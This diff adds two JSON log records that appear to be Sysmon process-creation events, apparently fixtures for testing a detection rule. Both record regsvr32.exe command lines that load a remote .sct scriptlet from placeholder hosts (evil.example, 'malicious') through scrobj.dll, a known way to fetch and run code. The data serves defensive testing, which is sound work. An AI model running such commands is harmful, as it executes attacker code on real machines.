@@ -1,0 +1,2 @@
+{"EventID": 1, "Image": "C:\\Windows\\System32\\regsvr32.exe", "CommandLine": "regsvr32.exe /s /u /i:http://evil.example/file.sct scrobj.dll"}
+{"EventID": 1, "Image": "C:\\Windows\\System32\\regsvr32.exe", "CommandLine": "regsvr32 /s /i:http://malicious/payload.sct scrobj.dll"}
